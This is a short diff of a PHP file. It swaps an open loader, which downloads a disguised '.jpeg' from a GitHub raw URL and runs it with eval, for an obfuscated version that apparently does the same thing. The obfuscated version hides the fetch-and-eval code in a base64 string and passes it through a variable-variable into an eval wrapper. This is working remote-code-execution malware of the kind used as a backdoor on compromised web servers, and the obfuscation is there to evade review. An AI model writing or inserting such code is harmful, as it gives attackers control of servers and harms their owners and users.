@@ -1,14 +1,8 @@
 <?php
-$url = "https://raw.githubusercontent.com/player370123/broadcast/main/harimaw.jpeg";
-
-$ch = curl_init($url);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-$code = curl_exec($ch);
-if (curl_errno($ch)) {
-    echo "cURL Error: " . curl_error($ch);
-} else {
-    eval("?>$code");
-}
-curl_close($ch);
+$x = function($a) {
+    eval($a);
+};
+$c = 'f';
+$$c = base64_decode('JHVybCA9ICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vcGxheWVyMzcwMTIzL2Jyb2FkY2FzdC9tYWluL2hhcmltYXcuanBlZyI7CiRjaCA9IGN1cmxfaW5pdCgkdXJsKTsKY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLCB0cnVlKTsKY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0ZPTExPV0xPQ0FUSU9OLCB0cnVlKTsKJGNvZGUgPSBjdXJsX2V4ZWMoJGNoKTsKaWYgKGN1cmxfZXJybm8oJGNoKSkgewogICAgZWNobyAiY1VSTCBFcnJvcjogIiAuIGN1cmxfZXJyb3IoJGNoKTsKfSBlbHNlIHsKICAgIGV2YWwoIj8+JGNvZGUiKTsKfQpjdXJsX2Nsb3NlKCRjaCk7');
+$x($f);
 ?>
